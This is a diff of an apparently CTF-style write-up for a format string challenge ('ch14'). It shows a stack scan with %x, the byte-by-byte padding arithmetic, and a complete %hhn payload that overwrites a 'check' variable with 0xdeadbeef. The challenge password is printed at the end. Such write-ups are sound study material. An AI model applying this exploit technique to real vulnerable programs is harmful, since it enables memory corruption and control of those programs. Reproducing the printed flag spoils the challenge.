@@ -50,22 +50,35 @@ with no **format specifier**. Examine the stack and find a way to change that va
 
 ### Solution:
 Let's try looking into the stack by usual payload to discover the posibility of overwritting and "scanning" the stack<br>
-`./ch14 $(python -c "print 'AAAA' + '%x.'*128")`<br>
+`./ch14 aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x`<br>
 Output:
-```
-check at 0xbffff958
-argv[1] = [AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.]
-fmt=[AAAA80485f1.0.0.c2.bffffaa4.b7fe1449.f63d4e2e.4030201.41414141.38343038.2e316635.2e302e30.622e3263.66666666.2e346161.65663762.3]
-check=0x4030201
-```
-As shown, the "AAAA" value is written in 9th location. 
 
-Exploit:
-"0xdeadbeef"  is too large (over 2 bytes), we have to divide **check** into **0xdead (57005)** and **0xbeef (48879)**.
-7 times %8x to pull esp in front of the check.
-%48811c%n output (0xbeef)
-%8126c%n(0xdead)
-in other words, payload is (beef address) + (dummy) + (dead address) + %8x*7 + (%48811c%n%8126c%n)
-Pass: 
+![image](https://user-images.githubusercontent.com/48288606/146907436-2d2cfdb9-ab69-411b-a6e7-2366ba28adb9.png)
+
+- As shown, the "AAAA" value is written in 9th of format string, we can prepare our value to this location.
+- There are 2 ways to get **"deadbeef"** value. We can split it into 4 bytes or 2 bytes, the more division, the more relief execution time is. So i take second method.
+- Split `0xdeadbeef` into 4 bytes and we will overwrite  with "little-endian" order. `0xef`, `0xbe`, `0xad`, `0xde` and convert to decimal for calculating for later as below:
+```
+>>> int(0xef)
+239
+>>> int(0x1be)
+446
+>>> int(0x2ad)
+685
+>>> int(0x3de)
+990
+```
+- We have to make these value increase continously in our stack so we ensure that **0xef < 0x1be < 0x2ad < 0x3de** and then we use **%hhn** to get 1 byte value to have our desired values. (We can use **%hn** if we use the first method - split into 2 parts of 2 bytes). Then we calculate the value to add between these bytes to get specific value. ([%n format specifier](https://www.geekforgeeks.org/g-fact-31/)
+ - We already have 16 bytes address, to get the right value of first byte. We pad more **239 - 16 = 223**
+ - We already have 239 bytes above, to get the right value of first byte. We pad more **446 - 239 = 207**
+ - We already have 446 bytes above, to get the right value of first byte. We pad more **685 - 446 = 239**
+ - We already have 685 bytes above, to get the right value of first byte. We pad more **990 - 685 = 305**
+
+Here's the layout of what we've done until now: 
+![image](https://user-images.githubusercontent.com/48288606/146911826-3d6f1aa6-cec3-4516-83da-dbaae0f18105.png)
+
+Payload: `./ch14 $(python -c "print('\x98\xfa\xff\xbf' + '\x99\xfa\xff\xbf' + '\x9a\xfa\xff\xbf' + '\x9b\xfa\xff\xbf' + '%223d%9\$hhn' + '%207d%10\$hhn' + '%239d%11\$hhn' + '%305d%12\$hhn')")`
+
+Pass: 1l1k3p0Rn&P0pC0rn
 
 
